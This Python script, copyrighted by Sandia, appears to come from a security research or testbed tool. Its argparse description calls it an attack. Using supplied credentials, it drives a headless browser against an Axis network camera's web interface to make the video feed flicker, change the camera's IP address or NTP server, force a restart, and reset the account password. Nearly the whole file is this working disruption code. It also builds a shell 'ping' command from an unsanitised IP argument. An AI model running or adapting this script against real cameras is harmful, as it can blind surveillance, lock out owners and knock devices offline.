#!/usr/bin/env python3

# Copyright 2021 National Technology & Engineering Solutions of Sandia, LLC (NTESS). 
# Under the terms of Contract DE-NA0003525 with NTESS, the U.S. Government retains 
# certain rights in this software.
# 
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
#from selenium.webdriver.chrome.options import Options
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import WebDriverException
from time import sleep
import argparse
import logging
import os

def main():

    parser = argparse.ArgumentParser(description=" Enter attack")
    parser.add_argument("-t", "--target", type=str, help="target IP addr", required=True)
    parser.add_argument("-u", "--username", type=str, help="username", required=True)
    parser.add_argument("-pw", "--password", type=str, help="password", required=True)
    parser.add_argument("-A", "--action", type=str, help="attack action", required=False)
    parser.add_argument("-Na", "--newIP", type=str, help="new IP addr", required=False)
    parser.add_argument("-ntp", "--newNTP", type=str, help="new NTP addr", required=False)
    parser.add_argument("-Np", "--newPass", type=str, help="new password", required=False)
    parser.add_argument("-mw", "--minWindow", type=bool, help="minimize browser window", required=False, default=False)

    args = parser.parse_args()

    target_ip = args.target
    username = args.username
    password = args.password
    action = args.action
    new_ip = args.newIP
    new_ntp = args.newNTP
    new_pass = args.newPass
    minWindow = args.minWindow

    ################ Initialize webdriver ########################

    ### CHROME ONLY: options required to keep persistent browser window
    #options = Options()
    #options.add_experimental_option("detach", True)
    #driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    options = Options()
    options.headless = True
    driver = webdriver.Firefox(options=options)

    # Open browser and authenticate, then navigate to main page
    driver.get("http://" + username + ":" + password + "@" + target_ip + "/axis-cgi/usergroup.cgi")
    sleep(3) # sleep required to load page
    driver.get("http://" + target_ip)
    sleep(5)

    #############################################################

    if minWindow == True:
        driver.minimize_window()

    if action == "flicker":
        flickerOutput(driver, target_ip)

    elif action == "changeIP":
        try:
            change_ip(driver, target_ip, new_ip)
        except TypeError:
            print("\nError: Need to provide a new IP address\n")

    elif action == "changeNTP":
        try:
            changeNTP(driver, target_ip, new_ntp)
        except TypeError:
            print("\nError: Need to provide a new NTP IP address\n")

    elif action == "restart":
        restartCamera(driver, target_ip)

    elif action == "changePass":
        try:
            changePassword(driver, target_ip, new_pass)
        except TypeError:
            print("\nError: Need to provide a new password\n")


def flickerOutput(driver, IP):
    driver.get("http://" + IP + "/#settings/stream")
    pic = driver.find_element(By.CLASS_NAME, "video__media")
    print(pic)
    image_src = pic.get_property('src')

    i = 0
    while i < 5:
        sleep(.5)
        driver.execute_script("arguments[0].src = arguments[1]", pic, "")
        sleep(.5)
        driver.execute_script("arguments[0].src = arguments[1]", pic, image_src)
        i+=1


def change_ip(driver, IP, newIP):

    print("\n" + "Changing IP address from " + IP + " to " + newIP + " ...\n")
    driver.get("http://" + IP +"/#settings/system/network/ip")
    sleep(3) # sleep to let page load
    
    gotcha = False
    while gotcha == False:
        try:
            ip_field = driver.find_element(By.XPATH, "//*[@id='AXIS-ipv4Setting']")
            gotcha = True
        except:
            gotcha = False

    # backspace out field, clear will force it to repopulate with original data
    for i in range(20):
        ip_field.send_keys(Keys.BACKSPACE)
    ip_field.send_keys(newIP)

    button = driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div[1]/div/div[1]/div[7]/button")
    button.click()
    print("DONE \n")


def changeNTP(driver, IP, newNTPaddr):
    print("\n" + "Changing NTP IP address to " + newNTPaddr + " ...\n")
    driver.get("http://" + IP + "/#settings/system/localization/dateTime")
    sleep(3) # sleep to let page load
    ntp_field = driver.find_element(By.XPATH, "//*[@id='AXIS-ntpServer1Setting']")
    radioBTN = driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div[1]/div/div[2]/div[1]/ul/li[2]/label")
    slider = driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div[1]/div/div[1]/div[1]/div/label")

    # Check if slider is open or closed by testing the radio button
    try:
        radioBTN.click()
    except WebDriverException:
        slider.click()
        pass

    # backspace and send new address
    radioBTN.click()
    for i in range(20):
        ntp_field.send_keys(Keys.BACKSPACE)
    ntp_field.send_keys(newNTPaddr)

    # No save action is required
    print("DONE \n")


def restartCamera(driver, IP):
    print("\n" + "Restarting camera at " + IP + " ... \n")
    gotcha = False
    while gotcha == False:
        try:
            driver.get("http://" + IP + "/#settings/system/tools/maintenance")
            gotcha = True
        except:
            pass
    sleep(1) #sleep to let page load
    
    gotcha = False
    while gotcha == False:
        try:
            restart_btn = driver.find_element(By.XPATH, "//*[@id='AXIS-maintenance-restart']/button")
            restart_btn.click()
            gotcha = True
        except:
            pass

    #pop-up
    sleep(0.5) # sleep to allow pop-up to load
    
    gotcha = False
    while gotcha == False:
        try:
            confirm_btn = driver.find_element(By.XPATH, "/html/body/div[3]/div[3]/button[2]")
            confirm_btn.click()
            gotcha = True
        except:
            pass
    
    sleep(7)
    print("\nCamera is offline... \n")

    # Ping camera to see when it is back online
    response = 1
    while response != 0:
        response = os.system("ping -c 1 " + IP)

    print("\nCamera is back online... \n")
    print("DONE \n")

def changePassword(driver, IP, newPW):
    print("\nChanging password to " + newPW +" ... \n")
    driver.get("http://" + IP + "/#settings/system/security/users")
    sleep(3)
    driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div[1]/div/div/div/div[2]/div[1]/div/div[2]").click()
    sleep(1)

    pwForm = driver.find_element(By.XPATH, "//*[@id='common-form-component-3']")
    pwRepeat = driver.find_element(By.XPATH, "//*[@id='common-form-component-4']")

    for i in range(20):
        pwForm.send_keys(Keys.BACKSPACE)
    pwForm.send_keys(newPW)

    for i in range(20):
        pwRepeat.send_keys(Keys.BACKSPACE)
    pwRepeat.send_keys(newPW)

    sleep(1)

    saveBtn = driver.find_element(By.XPATH, "/html/body/div[1]/div[3]/div[1]/div/div/div/div[2]/div[1]/div/div[2]/div[2]/div/div[6]/button[2]")
    saveBtn.click()

    print("\nDone\n")

class ValidationException(Exception):
    pass

if __name__=="__main__":
    try:
        main()
    except ValidationException as e:
        logging.error(e)
    except Exception as e:
        logging.exception(e)
